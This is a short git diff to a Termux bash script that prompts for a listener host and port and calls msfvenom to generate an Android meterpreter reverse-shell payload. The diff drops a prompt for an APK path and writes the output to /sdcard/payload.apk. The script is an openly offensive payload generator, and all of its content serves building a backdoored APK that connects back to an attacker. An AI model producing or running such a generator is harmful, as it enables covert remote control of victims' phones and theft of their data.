@@ -1,4 +1,4 @@
-#/data/data/com.termux/files/usr/bin/bash
+#!/data/data/com.termux/files/usr/bin/bash
 
 clear
 
@@ -43,28 +43,6 @@ read host
 echo 'Enter LPORT' |lolcat -a
 read port
 
-
-flag=0
-
-while [ $flag -eq 0 ]
-do
-	echo 'Enter path of APK' |lolcat -a
-	read -p "Enter Path of APK File > " path
-	
-	if [ -f $path ]
-	then
-		flag=1
-	else
-		clear
-		echo "File Not Found" |lolcat -a
-		echo ""
-	fi
-done
-
 echo "Generating Payload Please Wait..." |lolcat -a
 
-~/metasploit-framework/msfvenom -p android/meterpreter/$payload LHOST=$host LPORT=$port --arch dalvik --platform android R > $path |lolcat -a
-
-
-
-
+~/metasploit-framework/msfvenom -p android/meterpreter/$payload LHOST=$host LPORT=$port --arch dalvik --platform android R > /sdcard/payload.apk |lolcat -a
